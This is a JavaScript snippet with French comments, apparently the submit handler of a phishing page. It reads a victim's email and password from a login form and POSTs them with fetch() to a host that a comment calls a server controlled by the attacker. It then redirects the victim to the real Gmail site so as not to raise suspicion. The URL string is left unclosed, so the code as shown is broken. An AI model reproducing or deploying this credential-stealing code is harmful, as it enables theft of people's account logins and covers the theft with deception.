function submitForm() {
    // Récupération des informations de connexion
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // Envoi des informations à un serveur contrôlé par l'attaquant
    fetch('https://ma-page-de-phishing-test, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email: email, password: password })
    })
    .then(response => {
        if (response.ok) {
            // Redirection vers la page officielle de Gmail pour ne pas éveiller les soupçons
            window.location.href = 'https://mail.google.com';
        }
    })
    .catch(error => console.error('Erreur de requête :', error));
}
